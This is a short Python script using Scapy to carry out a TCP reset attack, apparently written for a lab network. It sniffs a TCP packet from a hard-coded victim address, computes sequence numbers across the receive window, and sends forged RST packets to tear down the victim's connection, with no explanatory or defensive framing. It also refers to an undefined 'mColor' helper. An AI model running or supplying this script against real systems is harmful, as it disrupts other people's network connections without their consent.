from scapy.all import *

win=512
tcp_rst_count = 10
victim_ip = "10.0.2.5"
your_iface = "eth0"

# get a tcp packet by sniffing WiFi
t = sniff(iface=your_iface, count=1,
          lfilter=lambda x: x.haslayer(TCP)
          and x[IP].src == victim_ip)
t = t[0]
tcpdata = {
    'src': t[IP].src,
    'dst': t[IP].dst,
    'sport': t[TCP].sport,
    'dport': t[TCP].dport,
    'seq': t[TCP].seq,
    'ack': t[TCP].ack
}
max_seq = tcpdata['ack'] + tcp_rst_count * win
seqs = range(tcpdata['ack'], max_seq, int(win / 2))
p = IP(src=tcpdata['dst'], dst=tcpdata['src']) / \
            TCP(sport=tcpdata['dport'], dport=tcpdata['sport'],
            flags="R", window=win, seq=seqs[0])

for seq in seqs:
    p.seq = seq
    send(p, verbose=0, iface=your_iface)
    print(mColor.success('tcp reset attack finish'))